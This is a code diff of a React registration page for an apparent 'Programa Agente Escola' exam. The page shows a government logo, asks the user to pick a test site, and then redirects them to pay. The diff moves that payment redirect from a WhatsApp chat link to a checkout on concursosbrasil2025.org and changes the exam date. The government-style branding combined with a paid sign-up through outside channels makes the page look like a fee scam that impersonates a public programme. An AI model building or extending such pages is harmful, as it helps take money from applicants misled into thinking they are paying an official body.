@@ -1,7 +1,6 @@
 import React, { useEffect, useState } from "react";
 import { Check, MapPin, DollarSign, GraduationCap, Award } from "lucide-react";
 import { useLocation } from "../context/LocationContext";
-import useUtmNavigator from "../hooks/useUtmNavigator";
 import GovLogo from "../components/GovLogo";
 import { usePixelTracking } from '../hooks/usePixelTracking';
 
@@ -55,8 +54,7 @@ const ProgramDetails: React.FC = () => {
 
 	useEffect(() => {
 		if (!selectedCEP) {
-			const navigate = useUtmNavigator();
-			navigate("/inscricao");
+			window.location.href = "/inscricao";
 			return;
 		}
 
@@ -88,7 +86,7 @@ const ProgramDetails: React.FC = () => {
 		if (selectedLocation && acceptedTerms.attendance && acceptedTerms.information) {
 			setShowSuccess(true);
 			setTimeout(() => {
-				window.location.href = "https://wa.me/5511917552877?text=Ol%C3%A1!%20Acabei%20de%20preencher%20meus%20dados%20no%20site%20do%20Programa%20Agente%20Escola%20e%20escolhi%20meu%20local%20de%20prova.%20Gostaria%20de%20finalizar%20minha%20inscri%C3%A7%C3%A3o%20e%20realizar%20o%20pagamento.%20Como%20devo%20proceder%3F?utm_source=FB&utm_campaign={{campaign.name}}|{{campaign.id}}&utm_medium={{adset.name}}|{{adset.id}}&utm_content={{ad.name}}|{{ad.id}}&utm_term={{placement}}";
+				window.location.href = "https://checkout.concursosbrasil2025.org/VCCL1O8SCK8R?utm_source=utm_source&utm_campaign=utm_campaign&utm_medium=utm_medium&utm_content=utm_content";
 			}, 4000);
 		}
 	};
@@ -229,7 +227,7 @@ const ProgramDetails: React.FC = () => {
 
 								<p className="text-gray-600 mb-6">
   Selecione abaixo o local de prova mais conveniente para você. <br />
- <strong> A prova será realizada no dia 23/05/2026 às 14h</strong>.
+ <strong> A prova será realizada no dia 05/02/2026 às 14h</strong>.
 </p>
 
 								<div className="space-y-4">
